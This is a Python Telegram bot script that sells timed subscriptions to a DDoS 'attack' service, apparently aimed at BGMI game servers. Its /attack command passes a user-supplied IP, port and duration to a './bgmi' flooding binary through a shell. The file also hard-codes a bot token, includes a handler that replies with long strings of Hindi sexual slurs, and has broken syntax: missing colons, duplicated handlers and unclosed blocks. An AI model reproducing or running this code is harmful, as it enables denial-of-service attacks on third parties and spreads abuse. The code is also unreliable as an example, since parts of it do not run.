import telebot
import subprocess
import datetime
import os
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# Insert your Telegram bot token here
bot = telebot.TeleBot('8051776188:AAEfH7tgGO5cM1v_jiY4jdWwgdJHtOGBavY')
# DEVELOPER --> @S4_LUCHI
# Admin user IDs
admin_id = ["","7209762563"]

# File to store allowed user IDs and their subscription expiry
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"

# File to store command logs
LOG_FILE = "log.txt"
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# Define subscription periods in seconds
subscription_periods = {
    '1min': 60,
    '1hour': 3600,
    '6hours': 21600,
    '12hours': 43200,
    '1day': 86400,
    '3days': 259200,
    '7days': 604800,
    '1month': 2592000,
    '2months': 5184000
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# Function to read subscriptions from the file
def read_subscriptions():
    subscriptions = {}
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    user_id = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        subscriptions[user_id] = expiry
                    except ValueError:
                        print(f"Error parsing date for user {user_id}: {expiry_str}")
                else:
                    print(f"Invalid line in subscription file: {line}")
    except FileNotFoundError:
        pass
    return subscriptions

# Function to write subscriptions to the file
def write_subscriptions(subscriptions):
    with open(SUBSCRIPTION_FILE, "w") as file:
        for user_id, expiry in subscriptions.items():
            file.write(f"{user_id} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# List to store allowed user IDs
allowed_user_ids = read_users()
subscriptions = read_subscriptions()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to check if a user is subscribed
def is_subscribed(user_id):
    if user_id in subscriptions:
        if datetime.datetime.now() < subscriptions[user_id]:
            return True
        else:
            del subscriptions[user_id]
            write_subscriptions(subscriptions)
    return False

# Function to add or update a user's subscription
def add_subscription(user_id, duration):
    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    subscriptions[user_id] = expiry
    write_subscriptions(subscriptions)
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            period = command[2]
            if period in subscription_periods:
                duration = subscription_periods[period]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                add_subscription(user_to_add, duration)
                response = f"User {user_to_add} added with {period} subscription successfully 🎉"
            else:
                response = "Invalid subscription period. Use: 1min, 1hour, 6hours, 12hours, 1day, 3days, 7days, 1month, or 2months."
        else:
            response = "Please specify a User ID and subscription period to add."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                if user_to_remove in subscriptions:
                    del subscriptions[user_to_remove]
                    write_subscriptions(subscriptions)
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 𝐚 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            expiry = subscriptions.get(user_id, "No subscription")
                            response += f"- @{username} (ID: {user_id}) | Expires: {expiry}\n"
                        except Exception as e:
                            response += f"- User ID: {user_id} | Expires: {subscriptions.get(user_id, 'No subscription')}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
        bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (
        f"🎇𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱🎇\n\n"
        f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: `{target}`\n"
        f"🔌 𝗣𝗼𝗿𝘁: `{port}`\n"
        f"⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: `{time} seconds`\n"
        f"🎮 𝗚𝗮𝗺𝗲: `𝗕𝗚𝗠𝗜`\n\n"
        f"🚀 𝗛𝗮𝗻𝗴 𝘁𝗶𝗴𝗵𝘁! 𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...🚀\n"
        f"🌐 𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗳𝗼𝗿 𝗼𝗽𝘁𝗶𝗺𝗮𝗹 𝗽𝗲𝗿𝗳𝗼𝗿𝗺𝗮𝗻𝗰𝗲.
     FEEDBACK MUST NO FEEDBACK DIRECTLY BAN FROM GRP 🚫"
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(
        telebot.types.InlineKeyboardButton("SUPPORT", url="https://t.me/ddos9908_bot")
    )
    
    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)


# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "⏳ 𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐁𝐀𝐁𝐘 ⏳\n🔺ᗯᗩᎥ丅 10 sec🔻"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if port >30000
                 response ="Tu Noob hai Ye Bgmi ka port nahi hai 😂 😂"
            if target >29999
                response ="Mujhe pagal samjha hai kya jo mai tumhara Fake attack maruga🤡"
            if time > 240:
                response = "𝐓𝐈𝐌𝐄 𝐈𝐒 𝐕𝐄𝐑𝐘 𝐇𝐈𝐆𝐇 \n\n𝐓𝐑𝐘 𝐓𝐎 --> 240sec(4min)✅ \n𝐁𝐞𝐟𝐨𝐫𝐞 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐀𝐭𝐭𝐚𝐜𝐤"
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"🔺𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄 𝐀𝐓𝐓𝐀𝐂𝐊🔻 \n\n💢𝗧𝗮𝗿𝗴𝗲𝘁 -> {target} \n💢𝗣𝗼𝗿𝘁: {port} \n💢𝗧𝗶𝗺𝗲: {time}
    FEEDBACK DIYE YA PHIR BAN KARU 😡😡"
        else:
            response = "💠𝐈𝐭'𝐬 𝐓𝐢𝐦𝐞 𝐓𝐨 𝐀𝐭𝐭𝐚𝐜𝐤💠 \n\n/vip <𝐭𝐚𝐫𝐠𝐞𝐭> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞>\n\nＲＥＡＤＹ ＦＯＲ ATTACK\n\nFEEDBACK CHAIYE NAHI TOH DIRECT BAN🚫"  # Updated command syntax
    else:
        response = "🚫 Access Denied!/n You need to be approved to use this bot.\nContact the owner for assistantance @Vip_DDos_07."

    bot.reply_to(message, response)

# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 


# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 






# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 






# Add /mylogs command to display logs recorded for bgmi and website commands


@bot.message_handler(commands=['plan'])
def show_plan(message):
   # response = "Our plans:\n"
    #response += "- Basic Plan: $10/month\n"
   # response += "- Pro Plan: $20/month\n"
    #response += "- Premium Plan: $30/month\n"
    response = "- 𝐃𝐌 𝐌𝐄 -- @Vip_DDos_07\n"

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def show_rules(message):
    response = "Rules:\n"
    response += "𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐚𝐫𝐞 𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐭𝐨 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐚𝐫𝐠𝐞𝐭𝐬 𝐨𝐧𝐥𝐲.\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids and is_subscribed(user_id):
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑"
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "Admin commands:\n"
        response += "/allusers - List all authorized users\n"
        response += "/clearlogs - Clear all command logs\n"
        response += "/remove <user_id> - Remove a user\n"
        bot.reply_to(message, response)
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐘𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃: `{user_id}`"
    bot.reply_to(message, response, parse_mode='Markdown')
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 


# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 

# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 


@bot.message_handler(commands=['canary'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/ONE_TIME_CHEAT/208"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['S4'])
def show_help(message):
    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 --> 𝐒𝟒 \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑 @𝐒𝟒_𝐋𝐔𝐂𝐇𝐈 \n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅 𝐒𝟒 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐆𝐑𝐏.
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/Vip_DDos_07'),
        telebot.types.InlineKeyboardButton('Support', url='https://t.me/Vip_DDos_07')
    )

    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '𝐓𝐡𝐢𝐬 𝐛𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐬 𝐲𝐨𝐮 𝐭𝐨 𝐩𝐞𝐫𝐟𝐨𝐫𝐦 𝐚𝐭𝐭𝐚𝐜𝐤𝐬\n'
    response += '🌍 WELCOME TO DDOS WORLD! 🎉\n'
    response += 'Get ready to dive into the action!\n'
    response += '💣 To unleash your power, use the /attack command followed by your target"s IP and port. ⚔️\n'
    response += '🔍 Example: After /attack, enter: ip port duration.\n'
    response += '🔥 Ensure your target is locked in before you strike!\n'
    response += '📚 New around here? Check out the /help command to discover all my capabilities. 📜\n'
    response += '⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign! 😈💥\n'
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('👤 Contact admin', url='https://t.me/Vip_DDos_07'),
        telebot.types.InlineKeyboardButton('Rate⭐', url='https://t.me/ddos9908_bot')  
    )

    bot.reply_to(message, response, reply_markup=keyboard)

# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '👤Owner Information:\n'
    response += 'For any inquiries, support, or collaboration opportunities, dont hesitate to reach out to the owner\n'
    response += '🤙Telegram: @Vip_Ddos_07\n'
    response += '🙏We value your feedback! Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n'
    response += '🌟 Thank you for being a part of our community! Your support means the world to us, and we’re always here to help\n'
                                                
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
            telebot.types.InlineKeyboardButton('♥️Join our Channel', url='https://t.me/ddos_bot_07'),
            telebot.types.InlineKeyboardButton('SUPPORT', url='https://t.me/PRIYA1FF')  
            )

    bot.reply_to(message, response, reply_markup=keyboard)

# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
@bot.message_handler(commands=['alive'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += 'Bro chill i am still alive 🚀'
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
                 telebot.types.InlineKeyboardButton('alive', url='https://t.me/ddos_bot_07'),
                         telebot.types.InlineKeyboardButton('SUPPORT', url='https://t.me/ddos_bot_07')  
                             )

    bot.reply_to(message, response, reply_markup=keyboard)

# S4 OFFICIAL GRP. JOIN TO MORE UPDATES
@bot.message_handler(commands=['gali'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '⚠️Gali\n'
    response +='Madarchod Randi ke bacche....Oye bosdike..madarchod,bhen ke lode..bosdike tu udta hua chamkader ki chamakta hua kala lund hai tu Kalia ka..tu14 baap ki Najais olad randi kay beez chinnale..oi madarchod chutmarke teri tatti jesi shakl pe pad dunga bhen k lode chutiye..maa k lode tere jese randi k baccho ko bachpan mai maar dena chiye..Bhenchod baap se panga matt le Warna maa chodh di Jayegi 🤬 🤓🤓🤓🤓🤓🤓🤓🤓🤓🤓'
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
                telebot.types.InlineKeyboardButton('gali', url='https://t.me/KaliaYtOwner'),
                        telebot.types.InlineKeyboardButton('gali', url='https://t.me/KaliaYtOwner')  
                            )
    bot.reply_to(message, response, reply_markup=keyboard)
   #op
   @bot.message_handler(commands=['ban'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '⚠️Ban\n'
    response +='Are yaar mai kaise ban karu🤡'
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
                telebot.types.InlineKeyboardButton('ban😎', url='https://t.me/KaliaYtOwner'),
                        telebot.types.InlineKeyboardButton('gali', url='https://t.me/KaliaYtOwner')
  #noob
    @bot.message_handler(commands=['gali'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '⚠️Gali\n'
    response +='Madarchod Randi ke bacche....Oye bosdike..madarchod,bhen ke lode..bosdike tu udta hua chamkader ki chamakta hua kala lund hai tu Kalia ka..tu14 baap ki Najais olad randi kay beez chinnale..oi madarchod chutmarke teri tatti jesi shakl pe pad dunga bhen k lode chutiye..maa k lode tere jese randi k baccho ko bachpan mai maar dena chiye. KaliaYtOwner')  
    #ko
    bot.reply_to(message, response, reply_markup=keyboard)
   #op
   @bot.message_handler(commands=['ban'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '⚠️Ban\n'
    response +='Are yaar mai kaise ban karu🤡'
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
                telebot.types.InlineKeyboardButton('ban😎', url='https://t.me/KaliaYtOwner'),
                        telebot.types.InlineKeyboardButton('To buy contact', url='https://t.me/@Vip_Ddos_07')
                            )
    bot.reply_to(message, response, reply_markup=keyboard)
                            )
#noob
bot.reply_to(message, response, reply_markup=keyboard)
   #op
   @bot.message_handler(commands=['noob'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '⚠️Noob\n'
    response +='Abe Noobre 1v1 aaja pata chal jaega kon noob hai tere jese bolne wale bhot dekhe hai🤡'
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
                telebot.types.InlineKeyboardButton('ban😎', url='https://t.me/KaliaYtOwner'),
                        telebot.types.InlineKeyboardButton('Room', url='https://t.me/Vip_Ddos_07') 
    #Movie
    @bot.message_handler(commands=['noob'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += 'MOVIES\n'
    response +='TO WATCH Movies click below 👇'
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
                telebot.types.InlineKeyboardButton('MOVIES', url='https://t.me/Movie_Bot_BY_ARU_bot'),
                        telebot.types.InlineKeyboardButton('Admin', url='https://t.me/Vip_Ddos_07')
# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
